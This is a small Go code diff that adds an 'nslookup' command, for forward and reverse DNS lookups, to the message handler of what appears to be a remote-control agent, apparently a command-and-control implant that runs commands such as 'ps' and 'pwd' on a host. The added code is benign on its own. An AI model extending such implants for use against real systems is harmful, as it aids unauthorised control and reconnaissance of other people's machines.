@@ -1072,6 +1072,24 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 					c.Stdout = fmt.Sprintf("Changed working directory to %s", path)
 				}
 			}
+		case "nslookup":
+			var query = p.Args
+			var response []string
+			var err error
+			if strings.ContainsAny(query, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") {
+				response, err = net.LookupHost(query)
+			} else {
+				response, err = net.LookupAddr(query)
+			}
+			if err == nil && len(response) > 0 {
+				c.Stdout = fmt.Sprintf("Query: %s\nResponse: %s\n", query, response)
+			} else {
+				if err != nil {
+					c.Stderr = fmt.Sprintf("Query: %s\nError: %s\n", query, err.Error())
+				} else {
+					c.Stderr = fmt.Sprintf("Server can't find: %s\n", query)
+				}
+			}
 		case "ps":
 			c.Stdout, c.Stderr = a.ps()
 		case "pwd":
